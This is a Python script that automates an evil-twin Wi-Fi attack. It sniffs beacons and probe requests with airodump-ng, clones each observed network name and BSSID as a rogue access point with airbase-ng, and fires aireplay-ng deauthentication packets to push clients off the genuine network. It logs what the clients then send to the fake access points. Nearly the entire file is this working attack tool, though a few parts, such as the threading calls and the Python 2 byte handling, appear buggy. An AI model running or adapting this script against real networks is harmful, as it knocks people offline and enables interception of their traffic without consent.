import subprocess
from time import sleep
import threading
from binascii import unhexlify, hexlify
import argparse
import os

cache = []

dump_num = 1


def start_AP(essid, bssid, netw_iface, path, channel):
    '''
    start new access point with certain parameters
    input:
        essid - essid of access point
        bssid - bssid of access point
        netw_iface - network interface name
        path - current dir
        channel - AP channel
    output:
        no
    '''
    try:
        import subprocess
        subprocess.check_call(["airmon-ng", "start", netw_iface, channel])
        
        kill = lambda process: process.terminate()
        import os
        os.chdir(path + "/logs/")
        if bssid == b"\xff\xff\xff\xff\xff\xff":
            cmd = subprocess.Popen(["airbase-ng", "--essid", essid, "-c", channel, "-F", essid + "_log", "-Z", "4", netw_iface + "mon"])
        else:
            cmd = subprocess.Popen(["airbase-ng", "--essid", essid,"-a", hexlify(bssid), "-c", channel, "-F", essid + "_log", "-Z", "4", netw_iface + "mon"])           
        timer = threading.Timer(3, kill, [cmd])
        try:
            timer.start()
            if (bssid) != b"\xff\xff\xff\xff\xff\xff":
                subprocess.check_call(["aireplay-ng", "-e", essid, "-a", hexlify(bssid), "--deauth", "4", netw_iface + "mon"])
            stdout, stderr = cmd.communicate()
        finally:
            timer.cancel()
            subprocess.check_call(["airmon-ng", "stop", netw_iface + "mon", channel])
            #subprocess.call(["python", path + "/converter_p.2.7.py", essid + "_log-01.cap", "hccap"])

    except Exception as e:
       print (e)


def lookup_dump(pcap_dump, netw_iface, path):
    '''
    lookup pcap dump and collect AP's and client's beacon packets
    input:
        pcap_dump - file 
        netw_iface - network interface name
        path - current dir
    output:
        no
    '''
    packet_index = -1
    error_index = 0
    flag = False
    print ("\n" + pcap_dump + " file is being investigated\n")
    try:
        while True:
            try:
                f = open(path + "/dumps/" + pcap_dump, 'rb')
                from pcapParser import load_savefile
                caps, header = load_savefile(f)
                packets = caps.packets
                # ------------------------------
                from time import time
                start = time()*1000
                # ------------------------------
                while time()*1000 - start <= 10:
                    packet_index += 1
                    #print str(packet_index) + "     " + str(time()*1000 - start) + "start " + str(start)
                    if flag == True and unhexlify(packets[packet_index][1].packet)[0] == b'\x80':    # if the packet is really a beacon
                        essid_len = int(unhexlify(packets[packet_index][1].packet)[37].encode("hex"), 16)
                        # ---------
                        if essid_len != 0:
                            current_essid = (unhexlify(packets[packet_index][1].packet)[38: 38 + essid_len]).encode("ascii")
                            if (unhexlify(packets[packet_index][1].packet)[38: 38 + essid_len]) != b'\xff\xff\xff\xff\xff\xff' and not(current_essid in cache):  # if we've already seen this ESSID before
                                print ("in "  + str(packet_index + 1) + " ESSID " + current_essid + " found")
                                cache.append(current_essid)
                                # ------
                                from threading import Thread
                                bssid = unhexlify((packets[packet_index][1].packet))[16: 22]
                                rates_len = int(unhexlify(packets[packet_index][1].packet)[38 + essid_len + 1].encode("hex"), 16)
                                channel = int(unhexlify((packets[packet_index][1].packet))[38 + essid_len + 1 + rates_len + 1 + 1 + 1].encode("hex"), 16)
                                #print "\nBSSID: " + str(bssid) + " " + hexlify(bssid) + " of length " + str(len(bssid)) + "\n"
                                task_AP = Thread(start_AP(current_essid, bssid, netw_iface, path, str(channel)))
                                task_AP.start()
                        # ---------
                    
                    elif flag == False and unhexlify(packets[packet_index][1].packet)[0] == b'\x40':  # or if the packet is really a probe request
                        essid_len = int(unhexlify(packets[packet_index][1].packet)[25].encode("hex"), 16)
                        # ---------
                        if essid_len != 0:
                            current_essid = (unhexlify(packets[packet_index][1].packet)[26: 26 + essid_len]).encode("ascii")
                            if (unhexlify(packets[packet_index][1].packet)[26: 26 + essid_len]) != b'\xff\xff\xff\xff\xff\xff':  # if we've already seen this ESSID before
                                print ("in "  + str(packet_index + 1) + " ESSID " + current_essid + " found")
                                cache.append(current_essid)
                                # ------
                                from threading import Thread
                                task_AP = Thread(start_AP(current_essid, b"\xff\xff\xff\xff\xff\xff", netw_iface, path, str(1)))
                                task_AP.start()
                        # ---------
                    

                # ------------------------------
                f.close()

            except IOError:
                print ("File is not ready yet...\n")
                sleep(2)
                # --------
                if error_index == 15:
                    print ("\nWaited too long, trying to scan the next file\n")
                    return 0
                # --------
                error_index += 1

            except IndexError:
                if flag == True:
                    print ("Scan is done\n")
                    break
                else:
                    flag = True
                    packet_index = -1

            except Exception as e:
                t = 10

    except KeyboardInterrupt:
        exit(1)


def start_sniff(netw_iface, path):
    '''
    lookup for pcap dump files in /logs folder
    input:
        pcap_dump - file 
        netw_iface - network interface name
        path - current dir
    output:
        no
    '''
    import os
    os.chdir(path + "/logs/")
    # -------------------------------------
    i = 1
    while i <= dump_num:
        if i <= 9:
            dump = "beac_dump-0" + str(i) + ".cap"
        else:
            dump = "beac_dump-" + str(i) + ".cap"

        lookup_dump(dump, netw_iface, path)
        i += 1


def timeout(p):
    p.kill()


def start_mon(netw_iface, path):
    '''
    monitor broadcast and save anything to pcap dump files in /logs folder
    input:
        netw_iface - network interface name
        path - current dir
    output:
        no
    '''
    import os
    os.chdir(path + "/dumps/")
    i = 0
    from random import randint
    subprocess.call(["airmon-ng", "start", netw_iface, str(randint(1, 14))])
    try:
        while i < dump_num:
            os.chdir(path + "/dumps/")
            kill = lambda process: process.terminate()
            cmd = subprocess.Popen(["airodump-ng", netw_iface + "mon", "--beacons", "--write", "beac_dump"])
            timer = threading.Timer(5, kill, [cmd])
            try:
                timer.start()
                stdout, stderr = cmd.communicate()
            finally:
                timer.cancel()
            i += 1

    except KeyboardInterrupt:
        exit(1)


def create_parser():
    '''
    create parser identity to parse cmd args
    input:
        no
    output:
        parser identity
    '''
    parser = argparse.ArgumentParser()
    parser.add_argument ('-s', '--send', type=str, default = '', help='name of the interface that is to be used for listening')
    parser.add_argument ('-l', '--listen', type=str, default = '', help = 'name of the interface that is to be used for creating AP and sending deauth packets')

    return parser

def create_folders():
    '''
    create folders
        current_timendate/
                        logs/ - false AP interaction dumps
                        dumps/ - simple air sniffing dunps
    input:
        no
    output:
        $PWD/current_timendate
    '''
    import datetime
    pwd = os.getcwd()
    _new = str(datetime.datetime.now())
    subprocess.call(["mkdir", _new])
    subprocess.call(["mkdir", _new + "/dumps"])
    subprocess.call(["mkdir", _new + "/logs"])
    return pwd + "/" + _new


if __name__ == "__main__":
    import sys

    parser = create_parser()
    namespace = parser.parse_args(sys.argv[1:])
 
    if namespace.send == '' or namespace.listen == '':
        print ('\ninvalid input params\n')
        exit(1)

    try:
        cwd = create_folders()
        # ----------------------
        itera = 0
        while True:
            os.chdir(cwd + "/dumps/")
            # ----------
            for i in range(1, dump_num + 1):
                extensions = [".cap", ".kismet.csv", ".csv", ".kismet.netxml"]
                for ext in extensions:
                    try:
                        subprocess.call(["rm", "beac_dump-0" + str(i) + ext])
                    
                    except Exception as e:
                        t = 10
            # ----------
            task1 = threading.Thread(target = start_mon, args=(namespace.send, cwd))
            task2 = threading.Thread(target = start_sniff, args=(namespace.listen, cwd))
            task1.start()
            task2.start()
            while True:
                if not(task1.isAlive()) and not(task2.isAlive()):
                    break
            os.chdir(cwd)
            itera += 1

    except Exception as e:
            print (str(e))
